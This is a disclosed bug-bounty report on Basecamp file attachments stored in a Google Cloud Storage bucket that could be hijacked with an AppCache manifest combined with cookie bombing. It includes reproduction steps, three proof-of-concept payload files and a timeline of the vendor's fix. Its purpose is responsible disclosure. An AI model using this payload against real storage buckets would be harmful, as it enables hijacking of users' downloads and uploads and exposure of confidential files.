---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/business-logic-errors
  - env/web
substate: "resolved"
weakness: "Business Logic Errors"
enriched: true
body: true
date: 2020-11-26
submitted: 2018-08-31T18:58:43.094Z
bounty_usd: null
votes: 57
cve: []
program: "[[programs/basecamp|Basecamp]]"
reporter: "hudmi"
source: "https://hackerone.com/reports/403602"
title: "Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket)"
---
# Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket)

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 57 | **Program:** Basecamp | **Disclosed:** 2020-11-26

- Report: [https://hackerone.com/reports/403602](https://hackerone.com/reports/403602)
- CWE: Business Logic Errors
- Submitted: 2018-08-31T18:58:43.094Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Basecamp attachments are stored in the `bc3_production_blobs` bucket in the root directory and can be served with `text/html` content-type. 

https://storage.googleapis.com/bc3_production_blobs/*key*?GoogleAccessId=bc3-production-storage%40bc3-production.iam.gserviceaccount.com&Expires=1535826443&Signature=*sign*&response-content-type=text/html

So with AppCache+CookieBombing trick an attacker can upload html file and if the user visit url of this file then all further uploads to this bucket and downloads from it will be hijacked by an attacker. 
To know more about this trick refer to https://labs.detectify.com/2018/08/02/bypassing-exploiting-bucket-upload-policies-signed-urls/

##Reproduction steps
To upload the files:
1. Login to 3.basecamp.com
2. Open campfire of any project
3. Upload target files 
4. Extract direct links of them to Google Storage and remove `response-content-disposition` param

I have uploaded 3 files by this way:
```
<html manifest="[manifest_url]">
This is the test page for a PoC. Now if you send any request in this bucket it will be hijacked.
<script>
setTimeout(function(){
for(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};
}, 3000);
</script>
</html>
```
```
CACHE MANIFEST 

FALLBACK:
/bc3_production_blobs/ [fallback_url]
```
```
<html>
<script>
alert('Your request to the page '+location.href+' is hijacked!');
</script>
</html>
```

##PoC
Go to http://████████/bc3attach and then try to open any direct link of `bc3_production_blobs` bucket. You will see alert popup with full url of this file.
Refer to the video.

## Impact

Direct links to any attachments can be hijacked and confedential files can be compromised

## Timeline

- **Report Filed**
- **Report Title Updated**
- **2018-09-01** @rosa: Thanks for this report, @hudmi! We'll have a look on Monday and will let you know.
- **Report Triaged**
- **2018-09-02** @hudmi: ok
- **Bounty Awarded**
- **2018-09-07** @hudmi: Thanks!
- **2018-10-12** @rosa: Hi @hudmi!

Sorry for the wait while we worked on this, and thanks for your patience. In the end, this was significantly more laborious than we thought, mainly due to how Google Cloud Storage works and our implementation. Fortunately, we believe we have now mitigated this. Could you please verify whether you can still reproduce this kind of attack?

Thank you!
- **2018-10-13** @hudmi: Confirmed
- **Report Severity Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
